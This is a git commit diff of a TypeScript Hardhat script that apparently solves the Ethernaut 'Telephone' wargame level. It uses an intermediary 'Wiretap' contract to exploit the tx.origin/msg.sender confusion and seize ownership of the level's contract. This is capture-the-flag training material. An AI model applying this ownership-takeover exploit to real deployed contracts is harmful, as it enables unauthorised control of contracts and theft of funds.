2ed0a7ab41ac35c99d01c318b84c7ea99ef36075
Crys <mariano.christopher123@gmail.com>
2022-12-13 16:58:41 +0800

    updated telephone level

--- scripts/attackTelephone.ts
+++ scripts/attackTelephone.ts
@@ -3,7 +3,8 @@ import { ethers } from "hardhat";
 
 const attackTelephone = async () => {
     // change contract addresses here.
-    const telephoneAddress = ""; //type "await contract.address()" in ethernaut console
+    const telephoneAddress = "0xF3AEFf7A6007cCB92593880594eBd587CD8379Dd"; //type "await contract.address()" in ethernaut console
+    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
     // wiretap address = "0xBa456e44a97609837fa1f2684539A8CDFf03F7db";
 
     // Don't touch below 🚀
@@ -13,6 +14,55 @@ const attackTelephone = async () => {
     // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
     // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
     // typing all commands in console below
+    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
+    const ABI = [
+        {
+            constant: undefined,
+            inputs: [],
+            payable: undefined,
+            stateMutability: "nonpayable",
+            type: "constructor",
+        },
+        {
+            constant: undefined,
+            inputs: [{ internalType: "address", name: "_owner", type: "address" }],
+            name: "changeOwner",
+            outputs: [],
+            payable: undefined,
+            signature: "0xa6f9dae1",
+            stateMutability: "nonpayable",
+            type: "function",
+        },
+        {
+            constant: true,
+            inputs: [],
+            name: "owner",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            payable: undefined,
+            signature: "0x8da5cb5b",
+            stateMutability: "view",
+            type: "function",
+        },
+    ];
+
+    const attack = await ethers.getContract("Wiretap");
+    const contract = await ethers.getContractAt(ABI, telephoneAddress);
+    console.log("Checking current Telephone owner...");
+    const owner = await contract.owner();
+    console.log(`Owner is: ${owner}`);
+    console.log("Changing owner by using another contract...");
+    const tx1 = await attack.changeOwner(telephoneAddress);
+    const tx1Receipt = tx1.wait();
+    console.log(tx1Receipt);
+    console.log("Checking Telephone owner again...");
+    const newOwner = await contract.owner();
+    console.log(`Owner is: ${newOwner}`);
+    if (player === newOwner) {
+        console.log("Congrats! player is now the new owner...");
+        console.log("You may now submit in ethernaut...");
+    } else {
+        console.log("player is still not the owner, review code above...");
+    }
 };
 
 attackTelephone()
